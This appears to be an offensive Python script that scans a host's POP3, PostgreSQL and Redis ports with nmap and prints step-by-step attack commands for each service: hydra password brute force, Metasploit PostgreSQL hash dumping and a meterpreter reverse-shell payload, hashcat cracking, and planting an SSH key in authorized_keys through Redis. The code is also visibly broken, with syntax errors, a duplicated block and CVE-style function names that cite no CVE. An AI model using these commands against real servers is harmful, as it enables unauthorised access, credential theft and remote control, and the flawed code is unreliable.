import nmap

def CVE_POP3_110_995(ip):
	nm = nmap.PortScanner()
	print("Scanning ports ...")
	nm.scan(ip, arguments='-sV -p110,995 --script pop3-capabilities')

	print("\t\tResult:")
	try:
		print("\t\t\tService: "+nm[ip]['tcp'][110]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][110]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][110]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][110]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][110]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][110]['extrainfo'])
	except:
		print("")

	try:
		print("\t\t\tService: "+nm[ip]['tcp'][110]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][110]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][110]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][110]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][110]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][110]['extrainfo'])
	except:
		print("")

	print("Now you can try to break access to POP3 server")
	print("For this use this command:\nhydra -L users.txt -: crackdict.txt pop3s://mail.example.org")

def CVE_PostgreSQL_5432(ip):
	nm = nmap.PortScanner()
	print("Scanning ports ...")
	nm.scan(ip, arguments='-sSV -p5432 -n')

	print("\t\tResult:")
	print("\t\t\tService: "+nm[ip]['tcp'][5432]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][5432]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][5432]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][5432]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][5432]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][5432]['extrainfo'])

	print("Bruteforce breaking passwords:\nIn metasploit:\nuse auxiliary/scanner/postgres/postgres_login\nsetrhosts\nset verbose false\nrun\n\n")
	print("Authentication in postgresql:\npsql -U postgres -d template1 -h <ip>\n\n")
	print("Getting hashes:\nIn metasploit:\nuse auxiliary/scanner/postgres/postgres_hashdump\nset rhosts\nset username postgres\nset password toto\nrun\n\n")
	print("Preparing hashes and breaking MD5 hashes:\ncat > hashes << STOP\nSTOP\nhashcat -m 10 hashes /usr/share/wordlists/sqlmap.txt\n\n")
	print("Running shell commands:\nIn metasploit:\nuse exploit/windows/postgres/postgres_payload\nset payload windows/meterpreter/reverse_tcp\nset rhost\nset username postgres\nset password toto\nrun\ngetuid\n\n")

def CVE_Redis_6379(ip):
	nm = nmap.PortScanner():
	print("Scanning ports ...")
	nm.scan(ip, arguments="-p6379 --script redis-info")

	print"\t\tResult:")
	print("\t\t\tService: "+nm[ip]['tcp'][6379]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][6379]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][6379]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][6379]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][6379]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][6379]['extrainfo'])

	print("Getting data from redis:\nredis-cli -h <ip>\nkeys *\nget keys---\n\n")
	print("Abuse of redis to save insidious content to disk:\nUse those commands:\nssh-keygen -t rsa -C \"crack@redis.io\"\n/tmp/id_rsa\n(echo -e \"\n\n\"; cat /tmp/id_rsa.pub; echo -e \"\n\n\") > /tmp/foo\nredis-cli -h <ip> echo flushall\ncat /tmp/foo | redis-cli -h <ip> -x set crackit\nredis-cli -h <ip>\nconfig set dir /home/redis/.ssh/\nconfig set dbfilename \"authorized_keys\"\nsave\nexit\nssh -i /tmp/id_rsa redis@<ip>\n\n")

